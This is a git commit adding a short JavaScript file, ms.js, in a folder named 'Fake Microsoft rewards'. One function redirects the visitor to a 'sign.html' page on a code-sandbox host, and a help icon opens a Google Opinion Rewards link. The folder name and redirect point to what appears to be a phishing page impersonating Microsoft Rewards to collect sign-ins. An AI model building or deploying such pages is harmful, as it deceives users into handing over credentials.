cabee8615de2c5a1063d312bde2c444e8189c4e9
Milo <79590178+e1r2t374@users.noreply.github.com>
2024-03-28 16:45:05 -0500

    Create ms.js

---
+++ frontend/Fake Microsoft rewards/js/ms.js
@@ -0,0 +1,7 @@
+function exe1() {
+  window.location.replace("https://duftmf.csb.app/sign.html");
+}
+
+document.querySelector("#helpicon").onclick = function () {
+  window.open("https://support.google.com/opinionrewards?hl=en", "_blank");
+};
